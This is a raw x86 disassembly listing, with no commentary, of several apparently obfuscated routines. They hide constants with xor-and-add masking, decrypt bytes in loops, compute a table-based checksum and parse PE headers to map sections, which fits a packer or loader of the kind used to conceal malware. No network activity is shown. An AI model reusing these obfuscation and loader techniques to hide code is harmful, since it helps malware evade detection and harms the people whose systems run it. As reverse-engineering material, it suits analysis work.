  4229c6:	add    ecx,edx
  4229c8:	shr    esi,cl
  4229ca:	mov    DWORD PTR [ebp-0x8],esi
  4229cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4229d0:	xor    ecx,eax
  4229d2:	lea    edi,[edi+ecx*1+0x3272fa]
  4229d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4229dc:	mov    esi,DWORD PTR [ebp-0x4]
  4229df:	xor    esi,eax
  4229e1:	xor    ecx,eax
  4229e3:	sub    ecx,esi
  4229e5:	cmp    edi,ecx
  4229e7:	jbe    0x422993
  4229e9:	mov    eax,DWORD PTR [ebp-0x8]
  4229ec:	pop    edi
  4229ed:	mov    DWORD PTR [ebx],eax
  4229ef:	mov    eax,DWORD PTR [ebp-0x8]
  4229f2:	pop    esi
  4229f3:	leave  
  4229f4:	ret    
  4229f5:	push   ebp
  4229f6:	mov    ebp,esp
  4229f8:	sub    esp,0x38
  4229fb:	push   ebx
  4229fc:	mov    ebx,0xf89c85b5
  422a01:	mov    DWORD PTR [ebp-0x4],ebx
  422a04:	lea    ecx,[ebx-0x1]
  422a07:	mov    DWORD PTR [ebp-0x24],ecx
  422a0a:	mov    eax,DWORD PTR [ebp-0x4]
  422a0d:	mov    edx,DWORD PTR [ebp+0x8]
  422a10:	push   esi
  422a11:	mov    esi,0x75108b3
  422a16:	xor    eax,esi
  422a18:	push   edi
  422a19:	mov    edi,0x3272fa
  422a1e:	add    eax,edi
  422a20:	cmp    edx,eax
  422a22:	mov    eax,DWORD PTR [ebp-0x4]
  422a25:	je     0x422b8a
  422a2b:	mov    edx,DWORD PTR [ebp+0xc]
  422a2e:	xor    eax,esi
  422a30:	add    eax,edi
  422a32:	cmp    edx,eax
  422a34:	je     0x422b87
  422a3a:	mov    eax,DWORD PTR [ebp+0x10]
  422a3d:	mov    edx,DWORD PTR [ebp+0xc]
  422a40:	mov    DWORD PTR [ebp-0x14],eax
  422a43:	mov    eax,DWORD PTR [ebp+0x8]
  422a46:	mov    DWORD PTR [ebp-0x18],0xf89c8522
  422a4d:	mov    DWORD PTR [ebp-0xc],eax
  422a50:	lea    eax,[ebx+0x6]
  422a53:	mov    DWORD PTR [ebp-0x1c],eax
  422a56:	mov    DWORD PTR [ebp-0x10],ebx
  422a59:	mov    DWORD PTR [ebp+0xc],ecx
  422a5c:	mov    DWORD PTR [ebp+0x10],eax
  422a5f:	mov    eax,DWORD PTR [ebp+0xc]
  422a62:	xor    eax,esi
  422a64:	mov    DWORD PTR [ebp-0x20],edx
  422a67:	sub    edx,eax
  422a69:	sub    edx,edi
  422a6b:	mov    DWORD PTR [ebp+0x8],edx
  422a6e:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  422a75:	jmp    0x422b77
  422a7a:	mov    eax,DWORD PTR [ebp+0xc]
  422a7d:	mov    ecx,DWORD PTR [ebp+0xc]
  422a80:	xor    eax,esi
  422a82:	xor    ecx,esi
  422a84:	lea    ecx,[eax+ecx*1+0x64e5f4]
  422a8b:	mov    eax,DWORD PTR [ebp+0x8]
  422a8e:	xor    edx,edx
  422a90:	div    ecx
  422a92:	mov    eax,DWORD PTR [ebp+0x10]
  422a95:	mov    ecx,DWORD PTR [ebp+0xc]
  422a98:	xor    eax,esi
  422a9a:	xor    ecx,esi
  422a9c:	sub    eax,ecx
  422a9e:	cmp    edx,eax
  422aa0:	jne    0x422b36
  422aa6:	mov    eax,DWORD PTR [ebp+0x8]
  422aa9:	mov    ecx,DWORD PTR [ebp-0xc]
  422aac:	mov    dl,BYTE PTR [eax+ecx*1]
  422aaf:	mov    eax,DWORD PTR [ebp-0x10]
  422ab2:	mov    ecx,DWORD PTR [ebp-0x8]
  422ab5:	xor    eax,esi
  422ab7:	xor    ecx,esi
  422ab9:	add    eax,edi
  422abb:	add    ecx,edi
  422abd:	cmp    eax,ecx
  422abf:	jae    0x422b07
  422ac1:	lea    ecx,[eax-0x3272fa]
  422ac7:	mov    DWORD PTR [ebp-0x4],ecx
  422aca:	mov    ebx,DWORD PTR [ebp-0x4]
  422acd:	xor    ebx,esi
  422acf:	add    ebx,0x7f55d8fb
  422ad5:	lea    ecx,[ebp+eax*4-0x38]
  422ad9:	mov    DWORD PTR [ecx],ebx
  422adb:	mov    ebx,DWORD PTR [ecx]
  422add:	cmp    ebx,0x244ecb9a
  422ae3:	jbe    0x422aed
  422ae5:	add    DWORD PTR [ecx],0x405fcd9
  422aeb:	jmp    0x422af3
  422aed:	add    DWORD PTR [ecx],0xfdaf4327
  422af3:	mov    ecx,DWORD PTR [ebp-0x8]
  422af6:	xor    ecx,esi
  422af8:	inc    eax
  422af9:	inc    DWORD PTR [ebp-0x4]
  422afc:	add    ecx,edi
  422afe:	cmp    eax,ecx
  422b00:	jb     0x422aca
  422b02:	mov    ebx,0xf89c85b5
  422b07:	cmp    DWORD PTR [ebp-0x14],0x0
  422b0b:	jne    0x422b15
  422b0d:	xor    dl,0x81
  422b10:	add    dl,0x6
  422b13:	jmp    0x422b2b
  422b15:	mov    eax,DWORD PTR [ebp-0x18]
  422b18:	xor    al,0xb3
  422b1a:	mov    cl,0x6
  422b1c:	sub    cl,al
  422b1e:	add    dl,cl
  422b20:	mov    ecx,DWORD PTR [ebp-0x1c]
  422b23:	xor    cl,0xb3
  422b26:	sub    cl,0x6
  422b29:	ror    dl,cl
  422b2b:	xor    eax,eax
  422b2d:	mov    eax,DWORD PTR [ebp+0x8]
  422b30:	mov    ecx,DWORD PTR [ebp-0xc]
  422b33:	mov    BYTE PTR [eax+ecx*1],dl
  422b36:	mov    eax,DWORD PTR [ebp+0x8]
  422b39:	mov    ecx,DWORD PTR [ebp-0x10]
  422b3c:	sub    eax,edi
  422b3e:	xor    eax,esi
  422b40:	cmp    eax,ecx
  422b42:	jne    0x422b65
  422b44:	mov    eax,DWORD PTR [ebp+0x10]
  422b47:	mov    ecx,DWORD PTR [ebp+0xc]
  422b4a:	xor    eax,esi
  422b4c:	xor    ecx,esi
  422b4e:	sub    eax,ecx
  422b50:	mov    ecx,DWORD PTR [ebp-0x20]
  422b53:	sub    eax,edi
  422b55:	xor    eax,esi
  422b57:	mov    DWORD PTR [ebp+0x10],eax
  422b5a:	mov    eax,DWORD PTR [ebp+0xc]
  422b5d:	xor    eax,esi
  422b5f:	sub    ecx,eax
  422b61:	sub    ecx,edi
  422b63:	jmp    0x422b74
  422b65:	mov    eax,DWORD PTR [ebp+0xc]
  422b68:	xor    eax,esi
  422b6a:	mov    ecx,0xffcd8d06
  422b6f:	sub    ecx,eax
  422b71:	add    ecx,DWORD PTR [ebp+0x8]
  422b74:	mov    DWORD PTR [ebp+0x8],ecx
  422b77:	mov    eax,DWORD PTR [ebp+0x10]
  422b7a:	cmp    eax,ebx
  422b7c:	jne    0x422a7a
  422b82:	mov    eax,DWORD PTR [ebp-0x24]
  422b85:	jmp    0x422b8a
  422b87:	mov    eax,DWORD PTR [ebp-0x4]
  422b8a:	xor    eax,esi
  422b8c:	add    eax,edi
  422b8e:	pop    edi
  422b8f:	pop    esi
  422b90:	pop    ebx
  422b91:	leave  
  422b92:	ret    0xc
  422b95:	push   ebp
  422b96:	mov    ebp,esp
  422b98:	sub    esp,0x420
  422b9e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  422ba5:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  422bac:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  422bb3:	push   ebx
  422bb4:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  422bbb:	mov    eax,DWORD PTR [ebp-0x14]
  422bbe:	push   esi
  422bbf:	mov    esi,0x75108b3
  422bc4:	push   edi
  422bc5:	xor    eax,esi
  422bc7:	mov    edi,0x3272fa
  422bcc:	add    eax,edi
  422bce:	mov    DWORD PTR [ebp-0x8],eax
  422bd1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  422bd8:	mov    DWORD PTR [ebp-0x4],0xead71895
  422bdf:	mov    DWORD PTR [ebp-0x10],0x8
  422be6:	mov    ecx,ecx
  422be8:	mov    eax,DWORD PTR [ebp-0xc]
  422beb:	mov    ecx,DWORD PTR [ebp-0x14]
  422bee:	xor    eax,esi
  422bf0:	xor    ecx,esi
  422bf2:	add    eax,edi
  422bf4:	add    ecx,edi
  422bf6:	imul   eax,ecx
  422bf9:	jmp    0x422c2c
  422bfb:	mov    eax,DWORD PTR [ebp-0x4]
  422bfe:	sub    eax,edi
  422c00:	xor    eax,esi
  422c02:	mov    DWORD PTR [ebp-0x8],eax
  422c05:	lea    ebx,[ebp-0x8]
  422c08:	call   0x42294d
  422c0d:	mov    DWORD PTR [ebp-0x8],eax
  422c10:	mov    eax,DWORD PTR [ebp-0x8]
  422c13:	mov    ecx,DWORD PTR [ebp-0x4]
  422c16:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  422c1d:	mov    eax,DWORD PTR [ebp-0xc]
  422c20:	mov    ecx,DWORD PTR [ebp-0x4]
  422c23:	xor    eax,esi
  422c25:	lea    eax,[eax+ecx*1+0x3272fa]
  422c2c:	mov    DWORD PTR [ebp-0x4],eax
  422c2f:	mov    eax,DWORD PTR [ebp-0x18]
  422c32:	mov    ecx,DWORD PTR [ebp-0xc]
  422c35:	xor    ecx,esi
  422c37:	xor    eax,esi
  422c39:	sub    eax,ecx
  422c3b:	mov    ecx,DWORD PTR [ebp-0x4]
  422c3e:	cmp    ecx,eax
  422c40:	jbe    0x422bfb
  422c42:	mov    eax,DWORD PTR [ebp-0x1c]
  422c45:	xor    eax,esi
  422c47:	add    eax,edi
  422c49:	mov    DWORD PTR [ebp-0x8],eax
  422c4c:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  422c53:	mov    ebx,ebx
  422c55:	jmp    0x422cb8
  422c57:	mov    ecx,DWORD PTR [ebp-0x20]
  422c5a:	mov    eax,DWORD PTR [ebp-0x8]
  422c5d:	xor    ecx,esi
  422c5f:	add    ecx,edi
  422c61:	shr    eax,cl
  422c63:	mov    DWORD PTR [ebp-0x4],eax
  422c66:	mov    eax,DWORD PTR [ebp+0x8]
  422c69:	mov    cl,BYTE PTR [eax]
  422c6b:	mov    BYTE PTR [ebp+0xb],cl
  422c6e:	mov    cl,BYTE PTR [ebp+0xb]
  422c71:	mov    edx,DWORD PTR [ebp-0x8]
  422c74:	movzx  ecx,cl
  422c77:	xor    ecx,edx
  422c79:	mov    DWORD PTR [ebp+0x8],ecx
  422c7c:	mov    ecx,DWORD PTR [ebp-0x18]
  422c7f:	mov    edx,DWORD PTR [ebp+0x8]
  422c82:	xor    ecx,esi
  422c84:	add    ecx,edi
  422c86:	and    ecx,edx
  422c88:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  422c8f:	mov    edx,DWORD PTR [ebp-0x4]
  422c92:	xor    ecx,edx
  422c94:	mov    DWORD PTR [ebp-0x8],ecx
  422c97:	mov    ecx,DWORD PTR [ebp-0xc]
  422c9a:	xor    ecx,esi
  422c9c:	lea    eax,[eax+ecx*1+0x3272fa]
  422ca3:	mov    DWORD PTR [ebp+0x8],eax
  422ca6:	mov    eax,DWORD PTR [ebp-0xc]
  422ca9:	xor    eax,esi
  422cab:	mov    ecx,0xffcd8d06
  422cb0:	sub    ecx,eax
  422cb2:	add    ecx,DWORD PTR [ebp-0x10]
  422cb5:	mov    DWORD PTR [ebp-0x10],ecx
  422cb8:	mov    eax,DWORD PTR [ebp-0x14]
  422cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  422cbe:	xor    eax,esi
  422cc0:	add    eax,edi
  422cc2:	cmp    ecx,eax
  422cc4:	jne    0x422c57
  422cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  422cc9:	mov    ecx,DWORD PTR [ebp-0x8]
  422ccc:	xor    eax,esi
  422cce:	add    eax,edi
  422cd0:	pop    edi
  422cd1:	pop    esi
  422cd2:	xor    eax,ecx
  422cd4:	pop    ebx
  422cd5:	leave  
  422cd6:	ret    0x4
  422cd9:	push   ebp
  422cda:	mov    ebp,esp
  422cdc:	mov    eax,DWORD PTR [ebp+0x1c]
  422cdf:	mov    ecx,DWORD PTR [ebp+0x8]
  422ce2:	mov    edx,DWORD PTR [ebp+0x10]
  422ce5:	mov    eax,DWORD PTR [eax+0x190]
  422ceb:	mov    eax,DWORD PTR [eax]
  422ced:	sub    esp,0x64
  422cf0:	push   ebx
  422cf1:	push   esi
  422cf2:	push   edi
  422cf3:	mov    edi,0x75108b3
  422cf8:	xor    ecx,edi
  422cfa:	mov    ebx,0x3272fa
  422cff:	add    ecx,ebx
  422d01:	cmp    ecx,edx
  422d03:	jne    0x422d14
  422d05:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  422d0f:	jmp    0x423210
  422d14:	mov    ecx,DWORD PTR [ebp+0x8]
  422d17:	mov    esi,DWORD PTR [ebp+0x14]
  422d1a:	mov    edx,DWORD PTR [esi]
  422d1c:	xor    ecx,edi
  422d1e:	add    ecx,ebx
  422d20:	cmp    edx,ecx
  422d22:	je     0x4231cb
  422d28:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d2b:	mov    DWORD PTR [ebp-0x1c],eax
  422d2e:	mov    DWORD PTR [ebp+0x1c],ecx
  422d31:	mov    ecx,DWORD PTR [ebp+0x18]
  422d34:	mov    eax,DWORD PTR [esi]
  422d36:	mov    DWORD PTR [ebp-0x20],eax
  422d39:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  422d40:	mov    edx,0xf89c85b4
  422d45:	mov    DWORD PTR [ebp-0x8],edx
  422d48:	mov    eax,DWORD PTR [ebp+0x1c]
  422d4b:	mov    DWORD PTR [ebp+0x1c],eax
  422d4e:	mov    eax,DWORD PTR [ebp+0x1c]
  422d51:	mov    eax,DWORD PTR [eax+0x190]
  422d57:	mov    eax,DWORD PTR [eax]
  422d59:	mov    DWORD PTR [ebp-0x24],ecx
  422d5c:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d5f:	mov    ecx,DWORD PTR [ecx+0x190]
  422d65:	mov    ecx,DWORD PTR [ecx]
  422d67:	add    ecx,DWORD PTR [eax+0x3c]
  422d6a:	mov    DWORD PTR [ebp+0x10],ecx
  422d6d:	mov    eax,DWORD PTR [ebp+0x8]
  422d70:	xor    eax,edi
  422d72:	add    eax,ebx
  422d74:	mov    DWORD PTR [ebp-0x4],eax
  422d77:	mov    eax,DWORD PTR [ebp+0x8]
  422d7a:	xor    eax,edi
  422d7c:	add    eax,ebx
  422d7e:	mov    DWORD PTR [ebp+0x18],eax
  422d81:	mov    eax,DWORD PTR [ebp+0x10]
  422d84:	mov    eax,DWORD PTR [eax+0x50]
  422d87:	sub    eax,0xc
  422d8a:	mov    DWORD PTR [ebp-0x28],eax
  422d8d:	mov    eax,DWORD PTR [ebp+0x10]
  422d90:	mov    eax,DWORD PTR [eax+0x38]
  422d93:	mov    ecx,DWORD PTR [ebp+0x10]
  422d96:	dec    eax
  422d97:	test   DWORD PTR [ecx+0x54],eax
  422d9a:	mov    eax,DWORD PTR [ebp+0x10]
  422d9d:	je     0x422db7
  422d9f:	mov    eax,DWORD PTR [eax+0x38]
  422da2:	mov    ecx,DWORD PTR [ebp+0x10]
  422da5:	mov    ecx,DWORD PTR [ecx+0x54]
  422da8:	dec    eax
  422da9:	not    eax
  422dab:	and    ecx,eax
  422dad:	mov    eax,DWORD PTR [ebp+0x10]
  422db0:	mov    eax,DWORD PTR [eax+0x38]
  422db3:	add    eax,ecx
  422db5:	jmp    0x422dba
  422db7:	mov    eax,DWORD PTR [eax+0x54]
  422dba:	mov    DWORD PTR [ebp+0x1c],eax
  422dbd:	mov    eax,DWORD PTR [ebp+0x8]
  422dc0:	xor    eax,edi
  422dc2:	add    eax,ebx
  422dc4:	mov    DWORD PTR [ebp+0x18],eax
  422dc7:	mov    eax,DWORD PTR [ebp+0x8]
  422dca:	xor    eax,edi
  422dcc:	add    eax,ebx
  422dce:	mov    DWORD PTR [ebp+0x18],eax
  422dd1:	mov    eax,DWORD PTR [ebp+0x8]
  422dd4:	mov    ecx,DWORD PTR [ebp-0x24]
  422dd7:	xor    eax,edi
  422dd9:	add    eax,ebx
  422ddb:	mov    DWORD PTR [ecx],eax
  422ddd:	mov    DWORD PTR [ebp+0x18],edx
  422de0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  422de7:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  422dee:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  422df5:	mov    eax,DWORD PTR [ebp-0x8]
  422df8:	mov    ecx,DWORD PTR [ebp+0x1c]
  422dfb:	xor    eax,edi
  422dfd:	add    eax,ebx
  422dff:	imul   eax,ecx
  422e02:	mov    ecx,DWORD PTR [ebp+0x8]
  422e05:	mov    edx,DWORD PTR [ebp-0x28]
  422e08:	xor    ecx,edi
  422e0a:	lea    ecx,[ecx+edx*1+0x3272fa]
  422e11:	cmp    eax,ecx
  422e13:	jae    0x4231c4
  422e19:	mov    eax,DWORD PTR [ebp+0x8]
  422e1c:	xor    eax,edi
  422e1e:	add    eax,ebx
  422e20:	mov    DWORD PTR [ebp+0x18],eax
  422e23:	mov    eax,DWORD PTR [ebp+0x1c]
  422e26:	add    eax,DWORD PTR [ebp-0x1c]
  422e29:	mov    DWORD PTR [ebp-0x4],eax
  422e2c:	push   DWORD PTR [ebp-0x4]
  422e2f:	mov    esi,DWORD PTR [ebp-0x1c]
  422e32:	mov    ecx,DWORD PTR [ebp+0x10]
  422e35:	call   0x421f85
  422e3a:	mov    DWORD PTR [ebp+0xc],eax
  422e3d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  422e44:	mov    eax,DWORD PTR [ebp-0x18]
  422e47:	xor    eax,edi
  422e49:	lea    ecx,[ebp-0x40]
  422e4c:	add    eax,ebx
  422e4e:	push   ecx
  422e4f:	call   0x422519
  422e54:	mov    eax,DWORD PTR [ebp+0xc]
  422e57:	test   eax,eax
  422e59:	je     0x422ea9
  422e5b:	mov    eax,DWORD PTR [ebp-0x18]
  422e5e:	xor    eax,edi
  422e60:	add    eax,ebx
  422e62:	push   eax
  422e63:	push   DWORD PTR [ebp+0xc]
  422e66:	lea    eax,[ebp-0x40]
  422e69:	push   eax
  422e6a:	call   0x42240f
  422e6f:	mov    eax,DWORD PTR [ebp-0x4]
  422e72:	mov    DWORD PTR [ebp-0x18],eax
  422e75:	mov    eax,DWORD PTR [ebp-0x18]
  422e78:	mov    ecx,DWORD PTR [ebp-0x1c]
  422e7b:	sub    eax,ecx
  422e7d:	mov    DWORD PTR [ebp-0x18],eax
  422e80:	mov    eax,DWORD PTR [ebp+0xc]
  422e83:	mov    ecx,DWORD PTR [ebp+0xc]
  422e86:	mov    eax,DWORD PTR [eax+0x10]
  422e89:	add    eax,DWORD PTR [ecx+0xc]
  422e8c:	mov    ecx,DWORD PTR [ebp-0x18]
  422e8f:	cmp    ecx,eax
  422e91:	jb     0x422ea9
  422e93:	mov    eax,DWORD PTR [ebp+0xc]
  422e96:	mov    eax,DWORD PTR [eax+0xc]
  422e99:	mov    ecx,DWORD PTR [ebp+0xc]
  422e9c:	add    eax,DWORD PTR [ecx+0x8]
  422e9f:	mov    ecx,DWORD PTR [ebp-0x18]
  422ea2:	sub    eax,ecx
  422ea4:	jmp    0x423197
  422ea9:	push   0xc
  422eab:	push   DWORD PTR [ebp-0x4]
  422eae:	lea    eax,[ebp-0x4c]
  422eb1:	push   eax
  422eb2:	call   0x42240f
  422eb7:	mov    eax,0xf89c85b5
  422ebc:	mov    DWORD PTR [ebp-0x2c],eax
  422ebf:	mov    DWORD PTR [ebp-0x30],0xf89c85b4
  422ec6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  422ecd:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  422ed4:	lea    ecx,[ebp-0x2c]
  422ed7:	mov    DWORD PTR [ebp-0xc],ecx
  422eda:	lea    ecx,[ebp-0x30]
  422edd:	mov    DWORD PTR [ebp-0x10],ecx
  422ee0:	lea    ecx,[ebp-0x34]
  422ee3:	mov    DWORD PTR [ebp+0xc],ecx
  422ee6:	lea    ecx,[ebp-0x38]
  422ee9:	mov    DWORD PTR [ebp-0x14],ecx
  422eec:	mov    ecx,DWORD PTR [ebp+0x8]
  422eef:	xor    ecx,edi
  422ef1:	add    ecx,ebx
  422ef3:	mov    DWORD PTR [ebp-0x18],ecx
  422ef6:	jmp    0x4230f2
  422efb:	cmp    eax,0xf89c85bb
  422f00:	je     0x423104
  422f06:	mov    ecx,DWORD PTR [ebp-0x8]
  422f09:	xor    ecx,edi
  422f0b:	mov    esi,eax
  422f0d:	add    ecx,ebx
  422f0f:	mov    DWORD PTR [ebp+0x18],ecx
  422f12:	mov    eax,DWORD PTR [ebp-0x18]
  422f15:	xor    esi,edi
  422f17:	lea    eax,[eax+esi*1+0x3272fa]
  422f1e:	mov    DWORD PTR [ebp-0x18],eax
  422f21:	mov    eax,DWORD PTR [ebp-0x8]
  422f24:	mov    ecx,DWORD PTR [ebp-0x18]
  422f27:	xor    eax,edi
  422f29:	add    eax,ebx
  422f2b:	cmp    ecx,eax
  422f2d:	jne    0x422f42
  422f2f:	mov    eax,DWORD PTR [ebp+0x8]
  422f32:	xor    eax,edi
  422f34:	add    eax,ebx
  422f36:	push   eax
  422f37:	push   0xc
  422f39:	lea    eax,[ebp-0x4c]
  422f3c:	push   eax
  422f3d:	call   0x4229f5
  422f42:	mov    eax,DWORD PTR [ebp-0xc]
  422f45:	mov    eax,DWORD PTR [eax]
  422f47:	xor    eax,edi
  422f49:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f50:	mov    ecx,DWORD PTR [ebp+0x8]
  422f53:	xor    ecx,edi
  422f55:	movzx  eax,al
  422f58:	add    ecx,ebx
  422f5a:	cmp    eax,ecx
  422f5c:	je     0x4230da
  422f62:	mov    eax,DWORD PTR [ebp-0x10]
  422f65:	mov    eax,DWORD PTR [eax]
  422f67:	xor    eax,edi
  422f69:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f70:	mov    ecx,DWORD PTR [ebp+0x8]
  422f73:	xor    ecx,edi
  422f75:	movzx  eax,al
  422f78:	add    ecx,ebx
  422f7a:	cmp    eax,ecx
  422f7c:	je     0x4230da
  422f82:	mov    eax,DWORD PTR [ebp+0xc]
  422f85:	mov    eax,DWORD PTR [eax]
  422f87:	xor    eax,edi
  422f89:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f90:	mov    ecx,DWORD PTR [ebp+0x8]
  422f93:	xor    ecx,edi
  422f95:	movzx  eax,al
  422f98:	add    ecx,ebx
  422f9a:	cmp    eax,ecx
  422f9c:	je     0x4230da
  422fa2:	mov    eax,DWORD PTR [ebp-0x14]
  422fa5:	mov    eax,DWORD PTR [eax]
  422fa7:	xor    eax,edi
  422fa9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fb0:	mov    ecx,DWORD PTR [ebp+0x8]
  422fb3:	xor    ecx,edi
  422fb5:	movzx  eax,al
  422fb8:	add    ecx,ebx
  422fba:	cmp    eax,ecx
  422fbc:	je     0x4230da
  422fc2:	mov    eax,DWORD PTR [ebp-0x10]
  422fc5:	mov    eax,DWORD PTR [eax]
  422fc7:	xor    eax,edi
  422fc9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fd0:	mov    ecx,DWORD PTR [ebp-0xc]
  422fd3:	mov    ecx,DWORD PTR [ecx]
  422fd5:	xor    ecx,edi
  422fd7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fde:	xor    al,cl
  422fe0:	mov    ecx,DWORD PTR [ebp+0xc]
  422fe3:	mov    ecx,DWORD PTR [ecx]
  422fe5:	xor    ecx,edi
  422fe7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fee:	or     al,cl
  422ff0:	mov    ecx,DWORD PTR [ebp-0xc]
  422ff3:	mov    ecx,DWORD PTR [ecx]
  422ff5:	xor    ecx,edi
  422ff7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  422ffe:	cmp    cl,al
  423000:	jne    0x4230da
  423006:	mov    eax,DWORD PTR [ebp+0xc]
  423009:	mov    eax,DWORD PTR [eax]
  42300b:	xor    eax,edi
  42300d:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423014:	mov    ecx,DWORD PTR [ebp-0x10]
  423017:	mov    ecx,DWORD PTR [ecx]
  423019:	xor    ecx,edi
  42301b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423022:	xor    al,cl
  423024:	mov    ecx,DWORD PTR [ebp-0x14]
  423027:	mov    ecx,DWORD PTR [ecx]
  423029:	xor    ecx,edi
  42302b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423032:	or     al,cl
  423034:	mov    ecx,DWORD PTR [ebp-0x10]
  423037:	mov    ecx,DWORD PTR [ecx]
  423039:	xor    ecx,edi
  42303b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423042:	cmp    cl,al
  423044:	jne    0x4230da
  42304a:	mov    eax,DWORD PTR [ebp-0x14]
  42304d:	mov    eax,DWORD PTR [eax]
  42304f:	xor    eax,edi
  423051:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423058:	mov    ecx,DWORD PTR [ebp+0xc]
  42305b:	mov    ecx,DWORD PTR [ecx]
  42305d:	xor    ecx,edi
  42305f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423066:	xor    al,cl
  423068:	mov    ecx,DWORD PTR [ebp-0xc]
  42306b:	mov    ecx,DWORD PTR [ecx]
  42306d:	xor    ecx,edi
  42306f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423076:	or     al,cl
  423078:	mov    ecx,DWORD PTR [ebp+0xc]
  42307b:	mov    ecx,DWORD PTR [ecx]
  42307d:	xor    ecx,edi
  42307f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423086:	cmp    cl,al
  423088:	jne    0x4230da
  42308a:	mov    eax,DWORD PTR [ebp-0x14]
  42308d:	mov    eax,DWORD PTR [eax]
  42308f:	xor    eax,edi
  423091:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423098:	mov    ecx,DWORD PTR [ebp-0xc]
  42309b:	mov    ecx,DWORD PTR [ecx]
  42309d:	xor    ecx,edi
  42309f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230a6:	xor    al,cl
  4230a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4230ab:	mov    ecx,DWORD PTR [ecx]
  4230ad:	xor    ecx,edi
  4230af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230b6:	or     al,cl
  4230b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4230bb:	mov    ecx,DWORD PTR [ecx]
  4230bd:	xor    ecx,edi
  4230bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  4230c6:	cmp    cl,al
  4230c8:	jne    0x4230da
  4230ca:	lea    eax,[ebp-0x4c]
  4230cd:	push   eax
  4230ce:	call   0x422b95
  4230d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4230d6:	cmp    eax,ecx
  4230d8:	je     0x4230e4
  4230da:	mov    eax,DWORD PTR [ebp+0x8]
  4230dd:	xor    eax,edi
  4230df:	add    eax,ebx
  4230e1:	mov    DWORD PTR [ebp+0x18],eax
  4230e4:	mov    eax,DWORD PTR [ebp-0x8]
  4230e7:	xor    eax,edi
  4230e9:	lea    eax,[eax+esi*1+0x3272fa]
  4230f0:	xor    eax,edi
  4230f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4230f5:	mov    edx,DWORD PTR [ebp+0x18]
  4230f8:	xor    ecx,edi
  4230fa:	add    ecx,ebx
  4230fc:	cmp    edx,ecx
  4230fe:	je     0x422efb
  423104:	mov    eax,DWORD PTR [ebp+0x8]
  423107:	mov    ecx,DWORD PTR [ebp+0x18]
  42310a:	xor    eax,edi
  42310c:	add    eax,ebx
  42310e:	cmp    ecx,eax
  423110:	jne    0x423123
  423112:	mov    eax,DWORD PTR [ebp-0x8]
  423115:	mov    ecx,DWORD PTR [ebp+0x1c]
  423118:	xor    eax,edi
  42311a:	lea    eax,[eax+ecx*1+0x3272fa]
  423121:	jmp    0x42319a
  423123:	push   0x18
  423125:	push   DWORD PTR [ebp-0x4]
  423128:	lea    eax,[ebp-0x64]
  42312b:	push   eax
  42312c:	call   0x42240f
  423131:	mov    eax,DWORD PTR [ebp+0x8]
  423134:	mov    ecx,DWORD PTR [ebp-0x18]
  423137:	xor    eax,edi
  423139:	add    eax,ebx
  42313b:	cmp    eax,ecx
  42313d:	je     0x423152
  42313f:	mov    eax,DWORD PTR [ebp+0x8]
  423142:	xor    eax,edi
  423144:	add    eax,ebx
  423146:	push   eax
  423147:	push   0x18
  423149:	lea    eax,[ebp-0x64]
  42314c:	push   eax
  42314d:	call   0x4229f5
  423152:	mov    eax,DWORD PTR [ebp-0x4]
  423155:	add    eax,0x18
  423158:	mov    DWORD PTR [ebp+0x18],eax
  42315b:	push   DWORD PTR [ebp-0x50]
  42315e:	push   DWORD PTR [ebp+0x18]
  423161:	mov    eax,DWORD PTR [ebp-0x54]
  423164:	add    eax,DWORD PTR [ebp-0x20]
  423167:	push   eax
  423168:	call   0x42240f
  42316d:	mov    eax,DWORD PTR [ebp+0x8]
  423170:	mov    ecx,DWORD PTR [ebp-0x18]
  423173:	xor    eax,edi
  423175:	add    eax,ebx
  423177:	cmp    eax,ecx
  423179:	je     0x42318c
  42317b:	push   0x0
  42317d:	push   DWORD PTR [ebp-0x50]
  423180:	mov    eax,DWORD PTR [ebp-0x54]
